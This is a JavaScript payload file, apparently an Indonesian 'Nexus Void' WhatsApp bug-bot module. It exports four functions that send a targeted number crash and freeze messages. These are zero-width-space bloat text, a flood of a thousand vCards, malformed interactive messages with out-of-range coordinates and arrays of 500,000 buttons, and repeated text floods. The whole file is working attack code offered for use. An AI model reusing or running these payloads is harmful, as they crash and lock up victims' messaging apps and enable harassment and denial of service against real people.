// payload.js — Koleksi Payload Nexus Void

// 1. Delay Kill / Invisible Bloat
export async function delay_kill(sock, target) {
  const invisibleText = "\u200B".repeat(65000);
  await sock.sendMessage(target, { text: invisibleText }).catch(() => {});
}

// 2. Force Freeze / Stunt UI
export async function force_freeze(sock, target) {
  const contacts = Array.from({ length: 1000 }, (_, i) => ({
    vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:Void_${i}\nTEL;type=CELL:+62811${String(i).padStart(8, '0')}\nEND:VCARD`,
  }));
  await sock.sendMessage(target, { contacts: { displayName: 'Void Contacts', contacts } }).catch(() => {});
}

// 3. Detective Crash (Kode asli lu)
export async function ran(sock, target) {
  await sock.sendMessage(target, { text: "kenalin aku ariel" }).catch(() => {});
  try {
    await sock.relayMessage(target, {
      interactiveMessage: {
        header: { title: "0", subtitle: "0", hasMediaAttachment: true, locationMessage: { degreesLatitude: -98.6289790, degreesLongitude: 89.9821647, name: "ahkk", address: "idnwn¿!🎭" } },
        body: { text: "kenalin aku ariel" },
        footer: { text: "kenalin aku ariel" },
        nativeFlowMessage: { buttons: [{ name: "single_select", buttonParamsJson: "{}" }, { name: 'address_message', buttonParamsJson: "\r" }], messageParamsJson: '{}' }
      }
    }, {});
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: { text: "kenalin aku ariel", display_text: "x9234" },
            nativeFlowMessage: { buttons: Array.from({ length: 500000 }, () => ({})), buttons: Array.from({ length: 500000 }, () => ({})), buttons: Array.from({ length: 500000 }, () => ({})) }
          }
        }
      }
    }, {});
  } catch (e) {}
}

// 4. Text Flood
export async function text_spam(sock, target) {
  const text = "NEXUS VOID ".repeat(2000);
  for(let i=0; i<3; i++) {
    await sock.sendMessage(target, { text }).catch(() => {});
  }
}